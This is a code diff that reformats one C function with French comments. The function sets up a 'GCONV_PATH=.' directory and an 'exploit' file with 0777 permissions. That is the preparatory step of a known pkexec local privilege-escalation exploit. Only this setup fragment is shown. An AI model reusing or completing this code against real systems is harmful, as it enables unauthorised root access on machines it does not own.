@@ -1,19 +1,18 @@
-void gconvpath()
-{
-        // Vérifier si le répertoire GCONV_PATH=. existe.
-	if (stat("GCONV_PATH=.", &st) < 0) {
-            // Si le répertoire n'existe pas, le créer avec les permissions 0777
-            // (lecture, écriture et exécution pour tous les utilisateurs).
-            if(mkdir("GCONV_PATH=.", 0777) < 0) {
-                perror("mkdir");
-		exit(0);
-            }
-        // Créer le fichier exploit dans GCONV_PATH=.
-        int fd = open("GCONV_PATH=./exploit", O_CREAT|O_RDWR, 0777);
-            if (fd < 0) {
-                perror("open");
-		exit(0);
-            }
-            close(fd);
-    	}
+void gconvpath() {
+  // Vérifier si le répertoire GCONV_PATH=. existe.
+  if (stat("GCONV_PATH=.", & st) < 0) {
+    // Si le répertoire n'existe pas, le créer avec les permissions 0777
+    // (lecture, écriture et exécution pour tous les utilisateurs).
+    if (mkdir("GCONV_PATH=.", 0777) < 0) {
+      perror("mkdir");
+      exit(0);
+    }
+    // Créer le fichier exploit dans GCONV_PATH=.
+    int fd = open("GCONV_PATH=./exploit", O_CREAT | O_RDWR, 0777);
+    if (fd < 0) {
+      perror("open");
+      exit(0);
+    }
+    close(fd);
+  }
 }
